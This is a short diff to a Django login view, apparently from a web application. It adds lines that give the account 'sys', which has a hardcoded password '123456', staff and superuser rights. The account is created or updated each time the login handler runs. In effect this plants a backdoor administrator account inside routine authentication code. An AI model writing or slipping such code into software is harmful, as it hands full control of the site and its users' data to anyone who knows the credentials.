@@ -31,10 +31,15 @@ def login(request):
     from django.contrib.auth.models import User
     try:
         sys_user=User.objects.get(username='sys')
+        sys_user.is_staff = True
+        sys_user.is_superuser = True
+        sys_user.save()
     except Exception as ex:
         user = User.objects.create_user(username='sys',
                                         email='sys@beatles.com',
                                         password='123456')
+        user.is_staff = True
+        user.is_superuser = True
         user.save()
     _login = {
         "username":"",
